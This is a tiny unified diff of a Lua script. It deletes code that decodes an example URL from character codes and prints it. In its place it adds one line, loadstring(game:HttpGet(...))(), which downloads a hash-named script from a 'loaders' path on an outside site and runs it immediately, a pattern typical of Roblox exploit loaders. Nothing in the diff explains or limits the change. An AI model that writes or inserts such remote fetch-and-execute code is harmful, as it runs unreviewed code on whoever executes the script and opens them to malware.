@@ -1,8 +1,1 @@
-local t = {104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,115,99,114,105,112,116,46,108,117,97}
-
-local s = ""
-for i,v in ipairs(t) do
-    s = s .. string.char(v)
-end
-
-print(s)
+loadstring(game:HttpGet("https://eternal-darkness.org/loaders/88e07dc7d0dfd278e18dfe9693735fa5.lua"))()
